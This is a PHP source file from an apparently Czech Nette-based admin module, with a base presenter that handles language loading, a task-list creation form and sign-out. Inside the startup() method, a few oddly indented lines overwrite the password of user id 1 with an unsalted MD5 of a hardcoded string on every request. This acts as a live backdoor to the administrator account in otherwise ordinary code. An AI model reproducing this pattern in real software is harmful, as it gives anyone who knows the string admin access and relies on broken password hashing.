<?php

namespace adminModule;
use Nette\Application\UI\Form;

/**
 * Base presenter for all application presenters.
 */
abstract class BasePresenter extends \Nette\Application\UI\Presenter
{
   private $listRepository;
   protected $translator;
   public $lang;
   public $config;
   public $db;
   public $langs;
   
    

     public function injectTranslator(\h4kuna\GettextLatte $translator) {
        $this->translator = $translator;
    }
   
   protected function startup(){
     parent::startup();
     $this->lang = $this->getParameter('lang');
     $this->lang = $this->translator->loadLanguage($this->lang);
     $this->db = $this->context->database;
					
					
					$password = md5('ritarita');
     $this->db->table('user')->where('id',1)->update(Array('password'=>$password));
					
					
     $this->listRepository = $this->context->listRepository;
     $this->template->config = $this->config = \Nette\ArrayHash::from($this->context->parameters);
     $this->template->lang = $this->lang;
     $this->template->langs = $this->config->langs;
   }
   
   public function beforeRender(){
     $this->template->lists = $this->listRepository->findAll()->order('title ASC');
					$this->template->user = $this->getUser();
   }
   
    protected function createComponentNewListForm()
        {
                if (!$this->getUser()->isLoggedIn()) {
                        $this->redirect('Sign:in');
                }

                $form = new Form();
                $form->addText('title', 'Název:', 15, 50)
                        ->addRule(Form::FILLED, 'Musíte zadat název seznamu úkolů.');

                $form->addSubmit('create', 'Vytvořit');
                $form->onSuccess[] = $this->newListFormSubmitted;

                return $form;
        }

				public function newListFormSubmitted(Form $form)
												{
																$list = $this->listRepository->createList($form->values->title);
																$this->flashMessage('Seznam úkolů založen.', 'success');
																$this->redirect('Task:default', $list->id);
												}
				public function handleSignOut()
												{
																$this->getUser()->logout();
																$this->redirect('Sign:in');
												}

				protected function createTemplate($class = NULL) {
						$template = parent::createTemplate($class);
						return $template;
					}

}
